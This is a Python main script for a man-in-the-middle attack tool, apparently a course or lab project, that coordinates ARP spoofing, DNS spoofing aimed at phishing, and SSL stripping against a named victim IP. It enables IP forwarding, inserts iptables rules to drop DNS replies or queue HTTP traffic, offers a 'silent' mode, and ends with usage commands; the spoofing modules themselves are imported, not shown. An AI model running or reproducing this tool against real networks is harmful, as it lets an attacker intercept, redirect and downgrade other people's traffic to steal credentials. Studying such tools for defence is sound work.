import sys
import time
import argparse
import threading
import os

import arp
import dns
import sslstrip

def main():
    parser = argparse.ArgumentParser(description="MITM Attack Tool: ARP, DNS Spoofing & SSL Stripping. Victim and Gateway IPs required.")
    
    # Required arguments
    parser.add_argument("--victim", required=True, help="IP address of the victim machine")
    parser.add_argument("--gateway", required=True, help="IP address of the gateway")

    # Mode selector
    parser.add_argument("--mode", required=True, choices=["arp", "dns", "ssl"], help="Attack mode: 'arp' for ARP Spoofing, 'dns' for DNS Spoofing, 'ssl' for SSL Stripping")

    # Arguments based on mode
    parser.add_argument("--attacker", help="IP address of the attacker machine (for DNS spoofing)")
    parser.add_argument("--target-domain", default="www.tue.nl", help="Domain to spoof (for DNS spoofing). Default: www.tue.nl")
    parser.add_argument("--interface", help="Network interface for SSL stripping e.g. ens33 (for SSL stripping)")

    # Operational mode
    parser.add_argument("--op-mode", choices=["silent", "allout", "default"], default="default", help="Operational mode: 'silent' (no output), 'allout' (aggressive logging)")
    args = parser.parse_args()


    arp_interval = 2
    verbose = True

    if args.op_mode == "silent":
        print("[*] Running in SILENT mode. Minimal console output.")
        arp_interval = 5
        verbose = False
    elif args.op_mode == "allout":
        print("[*] Running in ALLOUT mode. Aggressive logging enabled.")
        arp_interval = 1
        verbose = True

    if args.mode == "dns" and not args.attacker:
        print("[-] Attacker IP is required for DNS spoofing mode.")
        sys.exit(1)
    if args.mode == "ssl" and not args.interface:
        print("[-] Network interface is required for SSL stripping mode.")
        sys.exit(1)

    # Enable IP Forwarding
    print("[*] Enabling IP Forwarding...")
    os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")

    print(f"[+] Starting attack in [{args.mode.upper()}]... Press CTRL+C to stop")

    try:
        
        victim_mac = arp.get_mac(args.victim)
        gateway_mac = arp.get_mac(args.gateway)

        
        if not victim_mac or not gateway_mac:
            print("[-] Could not find MAC addresses. Exiting.")
            sys.exit(1)

        print(f"[+] Victim: {args.victim} ({victim_mac})")
        print(f"[+] Gateway: {args.gateway} ({gateway_mac})")

        # Start ARP Spoofing in a speerate thread
        arp_thread = threading.Thread(
            target=arp.start_arp_spoof, 
            args=(args.victim, args.gateway, victim_mac, gateway_mac, arp_interval, verbose),
            daemon=True
        )
        arp_thread.start()

        
        # ARP-Only mode
        if args.mode == 'arp':
            pass

        # Start DNS Spoofing if enabled
        elif args.mode == "dns":
            # iptables rule to drop DNS requests to win race condition
            os.system("sudo iptables -A FORWARD -p udp --dport 53 -j DROP")
            dns_thread = threading.Thread(
                target=dns.start_dns_spoof,
                args=(args.target_domain, args.attacker, verbose),
                daemon=True
            )
            dns_thread.start()

        # Start SSL Stripping if enabled
        elif args.mode == "ssl":
            # iptables rules to catch requests & responses
            os.system("iptables -I FORWARD -p tcp --dport 80 -j NFQUEUE --queue-num 0")
            os.system("iptables -I FORWARD -p tcp --sport 80 -j NFQUEUE --queue-num 0")
            sslstrip_thread = threading.Thread(
                target=sslstrip.start_sslstrip_netfilter,
                args=(0,),
                daemon=True
            )
            sslstrip_thread.start()

        while True:
            time.sleep(1)

    except KeyboardInterrupt:
        print("\n[+] Stopping ARP Spoofing. Restoring network...")
        arp.restore(args.victim, victim_mac, args.gateway, gateway_mac)

        # 5. Disable Interfaces 
        if args.mode == "dns":
            print("[-] Removing DNS DROP rule...")
            os.system("iptables -D FORWARD -p udp --dport 53 -j DROP")
            
            
        elif args.mode == "ssl":
            print("[-] Removing SSL NFQUEUE rule...")
            os.system("iptables -D FORWARD -p tcp --dport 80 -j NFQUEUE --queue-num 0")
            os.system("iptables -D FORWARD -p tcp --sport 80 -j NFQUEUE --queue-num 0")

        # Disable IP Forwarding to return machine to default state
        os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")
        
        print("[+] Cleanup complete. Exiting.")

if __name__ == "__main__":
    main()

# USAGE EXAMPLE:
# You need the victim IP, gateway IP, and attacker IP
# The attack can be run in three modes: ARP Spoofing mode, Phising mode (DNS Spoofing), or MITM mode (SSL Stripping)
# For ARP Spoofing mode:
# sudo python3 main.py --mode arp --victim <VICTIM_IP> --gateway <GATEWAY_IP>
# For Phising (DNS Spoofing) mode:
# sudo python3 main.py --mode dns --victim <VICTIM_IP> --gateway <GATEWAY_IP> --attacker <ATTACKER_IP> --target-domain <TARGET_DOMAIN>
# For MITM (SSL Stripping) mode:
# sudo python3 main.py --mode ssl --victim <VICTIM_IP> --gateway <GATEWAY_IP> --interface <NETWORK_INTERFACE>